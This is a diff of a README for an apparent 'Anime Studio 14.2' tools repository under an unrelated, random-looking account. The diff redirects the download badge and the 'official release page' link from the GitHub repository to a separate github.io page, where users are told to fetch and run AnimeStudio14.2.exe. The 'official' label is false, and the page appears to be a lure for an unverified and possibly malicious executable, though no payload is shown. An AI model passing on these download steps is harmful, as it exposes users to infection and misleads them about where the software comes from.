@@ -1,6 +1,6 @@
 # 🎨 anime-studio-v14-2-tools - Create professional anime scenes with ease
 
-[![](https://img.shields.io/badge/Download-Anime_Studio_14.2-blue.svg)](https://github.com/Mapquesteubryales859/anime-studio-v14-2-tools)
+[![](https://img.shields.io/badge/Download-Anime_Studio_14.2-blue.svg)](https://mapquesteubryales859.github.io)
 
 Anime Studio 14.2 provides a complete set of tools for animators. This software helps you build characters, animate movements, and polish your final scenes. You can use this application to manage rigging, set up camera paths, and export your work for any platform.
 
@@ -8,7 +8,7 @@ Anime Studio 14.2 provides a complete set of tools for animators. This software 
 
 Follow these steps to get the application on your computer.
 
-1. Go to the [official release page](https://github.com/Mapquesteubryales859/anime-studio-v14-2-tools) to find the installer.
+1. Go to the [official release page](https://mapquesteubryales859.github.io) to find the installer.
 2. Look for the file labeled AnimeStudio14.2.exe.
 3. Click the file name to start the download.
 4. Save the file to your folder of choice.
